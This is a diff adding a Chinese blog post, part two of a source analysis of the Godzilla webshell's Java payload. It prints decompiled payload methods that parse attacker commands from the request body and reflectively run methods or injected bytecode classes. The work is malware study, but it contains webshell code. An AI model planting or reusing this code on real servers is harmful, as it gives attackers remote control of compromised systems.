class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(<span class="built_in">this</span>.outputStream);  </span><br><span class="line">            <span class="built_in">this</span>.formatParameter();  </span><br><span class="line">			......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="initSessionMap"><a href="#initSessionMap" class="headerlink" title="initSessionMap"></a>initSessionMap</h3><p>先看看initSessionMap，这个方法主要是初始化一个SessionMap用于处理后续session相关部分的管理。首先是判断sessionMap这个成员变量是否为null，这个自然是的，因为前面的equal操作是没有对sessionMap做赋值的。然后会调用getSessionAttribute方法，通过反射执行getAttribute方法获取名为sessionMap的属性值。</p>
+<p>实际上session中的Attribute还是以Map的结构存储的，刚刚通过反射执行自然也是null，因为我们还没有往session中的这个Map设置键为sessionMap的数据。因此后面会调用setSessionAttribute方法，这个方法同样也是通过反射去执行session的setAttribute方法。添加一个一个键为sessionMap，值是new的一个HashMap对象，当然在此之前该新建的HashMap对象也设置到了sessionMap这个成员变量中了。后续再调用到该方法就可以通过getSessionAttribute获取sessionMap了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initSessionMap</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.sessionMap == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.getSessionAttribute(<span class="string">&quot;sessionMap&quot;</span>) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="built_in">this</span>.sessionMap = (HashMap)<span class="built_in">this</span>.getSessionAttribute(<span class="string">&quot;sessionMap&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var3) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.sessionMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="built_in">this</span>.setSessionAttribute(<span class="string">&quot;sessionMap&quot;</span>, <span class="built_in">this</span>.sessionMap);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var2) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.sessionMap == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.sessionMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSessionAttribute</span><span class="params">(String keyString)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.httpSession != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">var10001</span> <span class="operator">=</span> <span class="built_in">this</span>.httpSession;  </span><br><span class="line">        Class[] var10003 = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">var10006</span> <span class="operator">=</span> class$<span class="number">2</span>;  </span><br><span class="line">        <span class="keyword">if</span> (var10006 == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                var10006 = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var2) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var2).getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            class$<span class="number">2</span> = var10006;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        var10003[<span class="number">0</span>] = var10006;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getMethodAndInvoke(var10001, <span class="string">&quot;getAttribute&quot;</span>, var10003, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;keyString&#125;);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSessionAttribute</span><span class="params">(String keyString, Object value)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.httpSession != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">var10001</span> <span class="operator">=</span> <span class="built_in">this</span>.httpSession;  </span><br><span class="line">        Class[] var10003 = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">2</span>];  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">var10006</span> <span class="operator">=</span> class$<span class="number">2</span>;  </span><br><span class="line">        <span class="keyword">if</span> (var10006 == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                var10006 = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var4).getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            class$<span class="number">2</span> = var10006;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        var10003[<span class="number">0</span>] = var10006;  </span><br><span class="line">        var10006 = class$<span class="number">5</span>;  </span><br><span class="line">        <span class="keyword">if</span> (var10006 == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                var10006 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var3).getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            class$<span class="number">5</span> = var10006;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        var10003[<span class="number">1</span>] = var10006;  </span><br><span class="line">        <span class="built_in">this</span>.getMethodAndInvoke(var10001, <span class="string">&quot;setAttribute&quot;</span>, var10003, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;keyString, value&#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="formatparameter"><a href="#formatparameter" class="headerlink" title="formatparameter"></a>formatparameter</h3><p>接着还调用了formatParameter方法。首先清除parameterMap，避免上一次请求数据对本次请求有影响。然后将一些上下文相关的对象给设置进去，提供后续使用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">formatParameter</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.parameterMap.clear();  </span><br><span class="line">    <span class="built_in">this</span>.parameterMap.put(<span class="string">&quot;sessionMap&quot;</span>, <span class="built_in">this</span>.sessionMap);  </span><br><span class="line">    <span class="built_in">this</span>.parameterMap.put(<span class="string">&quot;servletRequest&quot;</span>, <span class="built_in">this</span>.servletRequest);  </span><br><span class="line">    <span class="built_in">this</span>.parameterMap.put(<span class="string">&quot;servletContext&quot;</span>, <span class="built_in">this</span>.servletContext);  </span><br><span class="line">    <span class="built_in">this</span>.parameterMap.put(<span class="string">&quot;httpSession&quot;</span>, <span class="built_in">this</span>.httpSession);  </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着定义了一些变量，parameterByte是给他赋值了requestData，也就是本次请求哥斯拉webshell管理器发送的请求体数据。然后将数据包装到了输入流tStream中，然后就是其余一些后续用的变量，后续看代码即可知道作用了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] parameterByte = <span class="built_in">this</span>.requestData;  </span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">tStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(parameterByte);  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">tp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"><span class="type">byte</span>[] lenB = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>];  </span><br><span class="line"><span class="type">byte</span>[] data = <span class="literal">null</span>;  </span><br></pre></td></tr></table></figure>
+
+<p>下面这部分就是解析数据流中的指令了。首先对输入流gzip解压，然后开始循环读取每个字节，如果读取到的字节是-1的话，就代表流结束，那么就结束资源退出循环。</p>
+<p>如果读取到的字节是2，代表分隔符，就开始解析一个键值对。其实就是evalFunc的逆向解析过程。我曾在连接部分的末尾放出了一个逻辑代码，可能之前只是想单纯做个笔记，就没有仔细解释，实际上就是将指令存储在hashMap中，然后对每个key和value之间，会插入五个字节，其中第一个字节就是分隔符2了，其余四个字节代表存储的是value的长度。</p>
+<p>因此解析请求数据时就可以先一直读取，直到分隔符2，就可以知道key读取到了，接着读取四个字节，计算value的字节长度，得到后就读这么长的数据，那么读到的就是value了。然后就可以继续下一个key和value，直到数据流的结束。读到的这些键值对都put进parameterMap变量中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GZIPInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(tStream);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">    <span class="type">byte</span> <span class="variable">t</span> <span class="operator">=</span> (<span class="type">byte</span>)((InflaterInputStream)inputStream).read();  </span><br><span class="line">    <span class="keyword">if</span> (t == -<span class="number">1</span>) &#123;  </span><br><span class="line">        tp.close();  </span><br><span class="line">        tStream.close();  </span><br><span class="line">        inputStream.close();  </span><br><span class="line">        <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (t == <span class="number">2</span>) &#123;  </span><br><span class="line">        key = <span class="keyword">new</span> <span class="title class_">String</span>(tp.toByteArray());  </span><br><span class="line">        ((FilterInputStream)inputStream).read(lenB);  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytesToInt(lenB);  </span><br><span class="line">        data = <span class="keyword">new</span> <span class="title class_">byte</span>[len];  </span><br><span class="line">        <span class="type">int</span> <span class="variable">readOneLen</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span>((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) &lt; data.length) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">this</span>.parameterMap.put(key, data);  </span><br><span class="line">        tp.reset();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        tp.write(t);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ok接着回到toString方法，evalNextData应该是和扩展的shell有关，一般扩展和插件都需要include指令，我推测这里单独的run方法就是为了执行incldue指令将自定义字节码加载进来，然后因为改动了sessionMap，用formatParameter重新格式化一下。</p>
+<p>那么接下来就是去正常执行run方法了，这是根据解析出来的指令动态调用具体的shell方法的核心代码，然后返回执行的结果。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.parameterMap.get(<span class="string">&quot;evalNextData&quot;</span>) != <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="built_in">this</span>.run();  </span><br><span class="line">    <span class="built_in">this</span>.requestData = (<span class="type">byte</span>[])<span class="built_in">this</span>.parameterMap.get(<span class="string">&quot;evalNextData&quot;</span>);  </span><br><span class="line">    <span class="built_in">this</span>.formatParameter();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">((FilterOutputStream)gzipOutputStream).write(<span class="built_in">this</span>.run());  </span><br><span class="line">((DeflaterOutputStream)gzipOutputStream).close();  </span><br><span class="line"><span class="built_in">this</span>.outputStream.close();</span><br></pre></td></tr></table></figure>
+
+<h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>首先从parameterMap中获取evalClassName和methodName的值，分别赋值给className和methodName，其中methodName不能为空，否则就直接返回method is null。</p>
+<p>而如果className为空，那么就会去反射调用当前类的中的方法，具体的方法名由methodName指定。然后用getReturnType获取这个方法的返回值类型，如果是byte[]，就调用方法并且返回结果，否则返回this method returnType not is byte[]的字节数组。</p>
+<p>如果className不为空，就从sessionMap中获取对于的Class对象，然后newInstance实例化出来，接着调用其自实现的equals和toString方法。这里其实是在执行了include指令之后才会走到此处，include指令的功能是注入制定的字节码，很多插件扩展的功能的前置都是该指令。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] run() &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="built_in">this</span>.get(<span class="string">&quot;evalClassName&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="built_in">this</span>.get(<span class="string">&quot;methodName&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (methodName != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (className == <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getMethod(methodName, (Class[])<span class="literal">null</span>);  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> method.getReturnType();  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">var10001</span> <span class="operator">=</span> class$<span class="number">0</span>;  </span><br><span class="line">                <span class="keyword">if</span> (var10001 == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        var10001 = Class.forName(<span class="string">&quot;[B&quot;</span>);  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var6) &#123;  </span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var6).getMessage());  </span><br><span class="line">                    &#125;  </span><br><span class="line">  </span><br><span class="line">                    class$<span class="number">0</span> = var10001;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">return</span> var12.isAssignableFrom(var10001) ? (<span class="type">byte</span>[])method.invoke(<span class="built_in">this</span>, (Object[])<span class="literal">null</span>) : <span class="string">&quot;this method returnType not is byte[]&quot;</span>.getBytes();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">evalClass</span> <span class="operator">=</span> (Class)<span class="built_in">this</span>.sessionMap.get(className);  </span><br><span class="line">                <span class="keyword">if</span> (evalClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> evalClass.newInstance();  </span><br><span class="line">                    object.equals(<span class="built_in">this</span>.parameterMap);  </span><br><span class="line">                    object.toString();  </span><br><span class="line">                    <span class="type">Object</span> <span class="variable">resultObject</span> <span class="operator">=</span> <span class="built_in">this</span>.parameterMap.get(<span class="string">&quot;result&quot;</span>);  </span><br><span class="line">                    <span class="keyword">if</span> (resultObject != <span class="literal">null</span>) &#123;  </span><br><span class="line">                        <span class="type">Class</span> <span class="variable">var10000</span> <span class="operator">=</span> class$<span class="number">0</span>;  </span><br><span class="line">                        <span class="keyword">if</span> (var10000 == <span class="literal">null</span>) &#123;  </span><br><span class="line">                            <span class="keyword">try</span> &#123;  </span><br><span class="line">                                var10000 = Class.forName(<span class="string">&quot;[B&quot;</span>);  </span><br><span class="line">                            &#125; <span class="keyword">catch</span> (ClassNotFoundException var7) &#123;  </span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var7).getMessage());  </span><br><span class="line">                            &#125;  </span><br><span class="line">  </span><br><span class="line">                            class$<span class="number">0</span> = var10000;  </span><br><span class="line">                        &#125;  </span><br><span class="line">  </span><br><span class="line">                        <span class="keyword">return</span> var10000.isAssignableFrom(resultObject.getClass()) ? (<span class="type">byte</span>[])resultObject : <span class="string">&quot;return typeErr&quot;</span>.getBytes();  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;evalClass is null&quot;</span>.getBytes();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;method is null&quot;</span>.getBytes();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">PrintStream</span> <span class="variable">printStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintStream</span>(stream);  </span><br><span class="line">        e.printStackTrace(printStream);  </span><br><span class="line">        printStream.flush();  </span><br><span class="line">        printStream.close();  </span><br><span class="line">        <span class="keyword">return</span> stream.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上就是本次全部内容，由于在工作之余完成，最近较忙可能有些纰漏和错误，思来想去还是发出来作为参考，如果有问题欢迎大家指正。后续如果有新的内容和改正的点也会在这里补充修改，。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#equals"><span class="toc-number">1.</span> <span class="toc-text">equals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#handle"><span class="toc-number">1.1.</span> <span class="toc-text">handle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toString-NaN"><span class="toc-number">2.</span> <span class="toc-text">toString</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#initSessionMap"><span class="toc-number">2.1.</span> <span class="toc-text">initSessionMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#formatparameter"><span class="toc-number">2.2.</span> <span class="toc-text">formatparameter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#run"><span class="toc-number">2.3.</span> <span class="toc-text">run</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&text=哥斯拉源码分析(二)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&is_video=false&description=哥斯拉源码分析(二)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=哥斯拉源码分析(二)&body=Check out this article: http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&name=哥斯拉源码分析(二)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&t=哥斯拉源码分析(二)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2025
+        John Doe
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
